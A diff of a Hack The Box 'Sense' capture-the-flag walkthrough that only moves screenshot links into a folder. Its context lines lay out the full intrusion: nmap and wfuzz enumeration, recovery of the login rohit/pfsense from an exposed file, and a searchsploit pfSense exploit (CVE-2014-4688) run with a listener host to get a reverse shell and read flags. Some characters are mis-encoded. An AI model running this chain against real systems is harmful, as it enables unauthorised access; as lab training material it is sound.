@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.10.174
 ```
 
-![ping](Sense_01_ping.png)
+![ping](screenshots/Sense_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -58,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.10.174 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![nmap all TCP ports](Sense_02_nmap_allports.png)
+![nmap all TCP ports](screenshots/Sense_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -66,7 +66,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractPorts](Sense_03_extractports.png)
+![extractPorts](screenshots/Sense_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -82,7 +82,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![nmap targeted scan](Sense_04_nmap_targeted_1.png)
+![nmap targeted scan](screenshots/Sense_04_nmap_targeted_1.png)
 
 Fingerprint the HTTP redirect and login surface:
 
@@ -90,7 +90,7 @@ Fingerprint the HTTP redirect and login surface:
 whatweb http://10.129.10.174
 ```
 
-![whatweb](Sense_05_whatweb.png)
+![whatweb](screenshots/Sense_05_whatweb.png)
 
 **Findings:**
 
@@ -101,7 +101,7 @@ whatweb http://10.129.10.174
 
 Open the site in a browser to confirm the **pfSense** login UI (here, a failed attempt with non-working credentials still proves the form is live):
 
-![pfSense login page](Sense_06_pfsense_login.png)
+![pfSense login page](screenshots/Sense_06_pfsense_login.png)
 
 ---
 ## 2. Service Enumeration
@@ -114,7 +114,7 @@ The web UI is only useful over **TLS**, but the certificate is **self-signed** a
 openssl s_client -connect 10.129.10.174:443
 ```
 
-![tls](Sense_07_openssl_tls.png)
+![tls](screenshots/Sense_07_openssl_tls.png)
 
 Factory **GUI** defaults for pfSense are documented by the vendor, but **`admin` / `pfsense`** did **not** work on this targetâ€”so the next pivot is **discovery of non-default material** (paths, files, or other users), not blind default guessing.
 
@@ -127,11 +127,11 @@ To hide repetitive â€œlogin page sizedâ€ responses during fuzzing, resp
 wfuzz -c -L --hc=404 --hl=173 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt https://10.129.10.174/FUZZ
 ```
 
-![wfuzz directory](Sense_08_wfuzz_directory.png)
+![wfuzz directory](screenshots/Sense_08_wfuzz_directory.png)
 
 The **`tree`** path stood out as a different response profile than the generic login page noise:
 
-![tree](Sense_09_tree_interface.png)
+![tree](screenshots/Sense_09_tree_interface.png)
 
 ---
 ### 2.3 Keyword-filtered `.txt` discovery
@@ -143,17 +143,17 @@ grep -iE "user|pass|note|key|database|pwd|admin|log|id|robots" /usr/share/wordli
 wfuzz -L -c --hc=404 --hl=173 -t 200 -w $(pwd)/files https://10.129.10.174/FUZZ.txt
 ```
 
-![grep wordlist](Sense_10_grep_wordlist.png)
+![grep wordlist](screenshots/Sense_10_grep_wordlist.png)
 
-![wfuzz txt hits](Sense_11_wfuzz_fuzz_txt.png)
+![wfuzz txt hits](screenshots/Sense_11_wfuzz_fuzz_txt.png)
 
 Review the first hit in the browser â€” **`changelog.txt`** summarized patching gaps (manual patching required; **2 of 3** issues mitigated):
 
-![changelog](Sense_12_changelog_txt.png)
+![changelog](screenshots/Sense_12_changelog_txt.png)
 
 Then review the second file â€” **`system-users.txt`** contained a support-ticket style request to create **`Rohit`** with a password described as **`company defaults`**:
 
-![system-users](Sense_13_system_users_txt.png)
+![system-users](screenshots/Sense_13_system_users_txt.png)
 
 **Recovered (redact if publishing):** username **`Rohit`**, password interpreted as the vendorâ€™s **factory default password class** for local users (**`pfsense`**), yielding a working GUI pair **`rohit` / `pfsense`** on this run (validated in `notes/ctf/htb-sense.md`).
 
@@ -170,7 +170,7 @@ searchsploit -m php/webapps/43560.py
 mv 43560.py pfsense_exploit.py
 ```
 
-![searchsploit EDB 43560](Sense_14_searchsploit_edb43560.png)
+![searchsploit EDB 43560](screenshots/Sense_14_searchsploit_edb43560.png)
 
 ---
 ### 3.2 Authenticated exploit (CVE-2014-4688 / EDB 43560)
@@ -183,7 +183,7 @@ Start a listener first, then run:
 python3 pfsense_exploit.py --rhost 10.129.10.174 --lhost 10.10.15.206 --lport 443 --username rohit --password pfsense
 ```
 
-![exploit script output](Sense_15_exploit_python_output.png)
+![exploit script output](screenshots/Sense_15_exploit_python_output.png)
 
 The script may print **`Error running exploit`** when the HTTP request **times out** while a reverse shell is caught on **`nc`**â€”that is expected in this setup. Ensure a listener is running on the chosen **`--lhost` / `--lport`** before launching the exploit.
 
@@ -210,7 +210,7 @@ cat /root/root.txt
 cat /home/rohit/user.txt
 ```
 
-![proof shell and flags](Sense_16_proof_shell_flags.png)
+![proof shell and flags](screenshots/Sense_16_proof_shell_flags.png)
 
 ðŸ **User flag obtained
 ðŸ Root flag obtained
